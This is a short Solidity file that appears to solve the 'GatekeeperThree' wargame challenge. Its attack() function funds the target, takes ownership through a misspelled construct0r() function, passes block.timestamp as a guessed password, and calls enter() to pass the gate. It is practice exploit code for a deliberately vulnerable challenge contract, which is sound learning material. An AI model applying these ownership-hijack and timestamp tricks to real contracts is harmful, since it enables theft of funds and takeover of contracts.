// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface SimpleTrick {
    function checkPassword(uint256) external returns (bool);
    function trickInit() external;
    function trickyTrick() external;
}

interface GatekeeperThree{
    function construct0r() external;
    function getAllowance(uint256) external;
    function createTrick() external;
    function enter() external;
}

contract Solve {
    address target;

    error NotEnoughBalance();

    constructor(address _target) payable {
        target = _target;
    }

    function attack() external {
        payable(target).call{value: 0.0011 ether}("");

        GatekeeperThree(target).construct0r();
        GatekeeperThree(target).createTrick();
        GatekeeperThree(target).getAllowance(block.timestamp);

        GatekeeperThree(target).enter();
    }
}